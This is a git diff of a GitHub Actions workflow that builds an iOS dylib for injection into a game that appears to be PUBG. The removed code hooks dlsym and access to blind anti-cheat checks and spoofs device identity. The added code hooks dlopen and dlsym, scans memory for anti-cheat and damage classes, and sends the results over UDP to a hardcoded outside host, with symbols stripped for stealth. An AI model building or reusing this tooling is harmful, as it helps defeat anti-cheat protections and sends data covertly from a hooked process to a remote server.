@@ -1,4 +1,4 @@
-name: Imperial V-MAX - Multi-Module Anti-Crash Sniper
+name: Imperial V-MAX - RDP Master Dumper
 
 on:
   push:
@@ -6,136 +6,168 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_anti_crash:
-    name: Compile Bulletproof Sniper Dylib
+  build_rdp_dumper:
+    name: Compile RDP Dumper Dylib
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Download Fishhook
+      - name: Prepare Workspace & Download Fishhook
         run: |
           mkdir -p jni
+          echo "Downloading fishhook for Non-JB compatibility..."
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
 
-      - name: Generate Anti-Crash Source (Main.mm)
+      - name: Generate C++ Payload (The Dumper Core)
         run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
-          #import <UIKit/UIKit.h>
-          #import <objc/runtime.h>
+          #import <sys/socket.h>
+          #import <netinet/in.h>
+          #import <arpa/inet.h>
+          #import <netdb.h>
           #import <dlfcn.h>
-          #import <mach-o/dyld.h>
+          #import <objc/runtime.h>
           #include "fishhook.h"
 
           /**
            * ========================================================
-           * 🛡️ MASOUD ANTI-CRASH SNIPER (V-MAX ZERO-PATCH)
-           * 🎯 TARGET: Blind Anti-Cheat WITHOUT touching memory bytes.
-           * ✅ SAFE FOR NON-JAILBREAK (No HWBP, No mprotect)
+           * 🛡️ MASOUD ULTIMATE RDP DUMPER (NON-JB)
+           * 🎯 سحب الفريم ووركات، الدوال، وكلاسات الذاكرة للسيرفر
            * ========================================================
            */
 
-          static void* (*orig_dlsym)(void* handle, const char* symbol);
-          static int (*orig_access)(const char *path, int amode);
+          // ⚠️ إعدادات سيرفر المهندس مسعود
+          #define RDP_DOMAIN "pubg.myvnc.com"
+          #define RDP_PORT 8080
 
-          // 🎯 دالة القناص: معرفة من المتصل وحساب الأوفست بالهواء
-          uintptr_t GetCallerOffset(const char* moduleName) {
-              void* ret_addr = __builtin_return_address(0);
-              Dl_info info;
-              if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  if (strstr(info.dli_fname, moduleName)) {
-                      return (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
-                  }
+          struct sockaddr_in server_addr;
+          BOOL isServerResolved = NO;
+
+          // 🌐 1. ترجمة النطاق إلى IP (لضمان الاتصال السريع)
+          void ResolveRDPServer() {
+              struct hostent *host = gethostbyname(RDP_DOMAIN);
+              if (host != NULL) {
+                  memset(&server_addr, 0, sizeof(server_addr));
+                  server_addr.sin_family = AF_INET;
+                  server_addr.sin_port = htons(RDP_PORT);
+                  server_addr.sin_addr.s_addr = *(long *)(host->h_addr_list[0]);
+                  isServerResolved = YES;
+                  NSLog(@"[MASOUD LAB] 🦅 RDP Server Resolved: %s", inet_ntoa(server_addr.sin_addr));
+              } else {
+                  NSLog(@"[MASOUD LAB] ❌ Failed to resolve RDP domain.");
               }
-              return 0;
+          }
+
+          // 📡 2. دالة إرسال البيانات الصاروخية للـ RDP
+          void SendToRDP(NSString* type, NSString* data) {
+              if (!isServerResolved) return;
+
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+                  NSDictionary *payload = @{ @"type": type, @"data": data };
+                  NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+                  if (!json) return;
+
+                  int sock = socket(AF_INET, SOCK_DGRAM, 0);
+                  if (sock < 0) return;
+
+                  sendto(sock, [json bytes], [json length], 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+                  close(sock);
+              });
           }
 
           // ==========================================
-          // ⚔️ خطافات التضليل (The Poisoned Response)
+          // 🕵️ الجواسيس (Hooks - Fishhook)
           // ==========================================
 
-          void* hk_dlsym(void* handle, const char* symbol) {
-              uintptr_t anogs_offset = GetCallerOffset("anogs");
-              
-              // 🔥 حماية أوفست مسعود الذهبي 0x459C
-              if (anogs_offset > 0x4500 && anogs_offset < 0x4650) {
-                  if (symbol && (strstr(symbol, "ptrace") || strstr(symbol, "MSHook") || strstr(symbol, "fishhook"))) {
-                      NSLog(@"[MASOUD SNIPER] 🎯 Blinding anogs at 0x%lx for symbol: %s", anogs_offset, symbol);
-                      return NULL; // نرجّع NULL بدلاً من ضرب الذاكرة بالـ RET، وبدون كراش!
+          // 1. جاسوس بوابة التحميل (dlopen) - يصيد الفريم ووركات
+          static void* (*orig_dlopen)(const char *path, int mode);
+          void* my_dlopen(const char *path, int mode) {
+              if (path != NULL) {
+                  NSString *pathStr = [NSString stringWithUTF8String:path];
+                  if ([pathStr containsString:@"Frameworks"] || [pathStr containsString:@".dylib"] || [pathStr containsString:@"anogs"]) {
+                      SendToRDP(@"FRAMEWORK", [pathStr lastPathComponent]);
+                  }
+              }
+              return orig_dlopen(path, mode);
+          }
+
+          // 2. جاسوس سحب الدوال (dlsym) - يصيد الأكواد التي يتم سحبها
+          static void* (*orig_dlsym)(void* handle, const char* symbol);
+          void* my_dlsym(void* handle, const char* symbol) {
+              if (symbol != NULL) {
+                  NSString *symStr = [NSString stringWithUTF8String:symbol];
+                  // فلترة دوال النظام العادية لمنع الضغط على السيرفر
+                  if (![symStr hasPrefix:@"CF"] && ![symStr hasPrefix:@"UI"] && ![symStr hasPrefix:@"NS"]) {
+                      SendToRDP(@"FUNCTION", symStr);
                   }
               }
               return orig_dlsym(handle, symbol);
           }
 
-          int hk_access(const char *path, int amode) {
-              uintptr_t shadow_offset = GetCallerOffset("ShadowTrackerExtra");
+          // ==========================================
+          // 🧠 ماسح الذاكرة الآمن (Safe Memory Scanner)
+          // ==========================================
+          void StartMemoryScanner() {
+              NSLog(@"[MASOUD LAB] 🧠 Scanning Decrypted Memory...");
               
-              // 🔥 حماية أوفستات الشادو اللي عطيتني إياها يا ذيب
-              // بدلاً من عمل Patch للذاكرة، سنقوم بتزييف نتائج الفحص لهذه الأوفستات
-              if (shadow_offset > 0) {
-                  NSArray *targets = @[@"382AA78", @"38B655C", @"03D87E24", @"0384C5CC", @"04B460FC", @"0381C640"];
-                  NSString *currentOffset = [NSString stringWithFormat:@"%lx", shadow_offset];
-                  
-                  for (NSString *t in targets) {
-                      if ([currentOffset containsString:t]) {
-                          if (path && (strstr(path, "mobileprovision") || strstr(path, "Cydia") || strstr(path, "Masoud"))) {
-                              return -1; // الكذبة البيضاء: الملف غير موجود
-                          }
-                      }
+              int numClasses = objc_getClassList(NULL, 0);
+              Class *classes = (Class *)malloc(sizeof(Class) * numClasses);
+              numClasses = objc_getClassList(classes, numClasses);
+              
+              for (int i = 0; i < numClasses; i++) {
+                  NSString *className = NSStringFromClass(classes[i]);
+                  // صيد كلاسات اللعبة والحماية بعد فك التشفير
+                  if ([className containsString:@"STExtra"] || [className containsString:@"AntiCheat"] || [className containsString:@"Damage"]) {
+                      SendToRDP(@"MEMORY_DUMP", [NSString stringWithFormat:@"Decrypted Class: %@", className]);
                   }
               }
-              return orig_access(path, amode);
+              free(classes);
+              NSLog(@"[MASOUD LAB] ✅ Memory Scan Sent to RDP.");
           }
 
           // ==========================================
-          // 🎭 نظام تزييف الهوية (الـ 12 نقطة لمنع الـ 30 دقيقة)
-          // ==========================================
-          void ApplySpoofing() {
-              // تزييف الموديل والاسم والنظام
-              method_setImplementation(class_getInstanceMethod([UIDevice class], @selector(model)), imp_implementationWithBlock(^NSString* (id self) { return @"iPad"; }));
-              method_setImplementation(class_getInstanceMethod([UIDevice class], @selector(name)), imp_implementationWithBlock(^NSString* (id self) { return @"iPad Pro (12.9-inch)"; }));
-              method_setImplementation(class_getInstanceMethod([UIDevice class], @selector(systemVersion)), imp_implementationWithBlock(^NSString* (id self) { return @"17.4"; }));
-              
-              // تزييف الهاردوير
-              method_setImplementation(class_getInstanceMethod([NSProcessInfo class], @selector(physicalMemory)), imp_implementationWithBlock(^unsigned long long(id self) { return 17179869184ULL; }));
-              
-              // تزييف الحافظة (لإخفاء الروابط المنسوخة)
-              method_setImplementation(class_getInstanceMethod([UIPasteboard class], @selector(string)), imp_implementationWithBlock(^NSString* (id self) { return @""; }));
-          }
-
-          // ==========================================
-          // 🚀 التفعيل المركزي الصامت
+          // 🚀 التفعيل المركزي للدايلب
           // ==========================================
           __attribute__((constructor))
-          static void start_bulletproof_sniper() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+          static void masoud_master_init() {
+              // 1. ترجمة النطاق وزرع الجواسيس فوراً
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+                  ResolveRDPServer();
                   
-                  ApplySpoofing();
-
                   struct rebinding hooks[] = {
-                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym},
-                      {"access", (void *)hk_access, (void **)&orig_access}
+                      {"dlopen", (void *)my_dlopen, (void **)&orig_dlopen},
+                      {"dlsym", (void *)my_dlsym, (void **)&orig_dlsym}
                   };
                   rebind_symbols(hooks, 2);
-
-                  NSLog(@"[MASOUD LAB] 🦅 BULLETPROOF SNIPER ACTIVE! NO PATCH, NO CRASH.");
+                  
+                  NSLog(@"[MASOUD LAB] 🦅 Ultimate Dumper Active (RDP Mode)");
+              });
+              
+              // 2. فحص الذاكرة بعد 15 ثانية (ننتظر فك التشفير باللعبة)
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+                  StartMemoryScanner();
               });
           }
           EOF
 
-      - name: Compile Anti-Crash Sniper
+      - name: Compile and Link Dylib
         run: |
+          echo "Compiling the masterpiece..."
+          # تمت إضافة -lobjc لدعم دوال فحص الذاكرة الخاصة بـ Objective-C
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Masoud-Bulletproof-Sniper.dylib \
-          -framework Foundation -framework UIKit -lobjc
-          strip -x Masoud-Bulletproof-Sniper.dylib
+          jni/main.mm jni/fishhook.c -o Masoud-RDP-Dumper.dylib \
+          -framework Foundation -lobjc
+          
+          echo "Stripping symbols for maximum stealth..."
+          strip -x Masoud-RDP-Dumper.dylib
 
-      - name: Upload Artifact
+      - name: Upload The Arsenal
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-AntiCrash-Sniper
-          path: Masoud-Bulletproof-Sniper.dylib
+          name: Masoud-RDP-Dumper
+          path: Masoud-RDP-Dumper.dylib
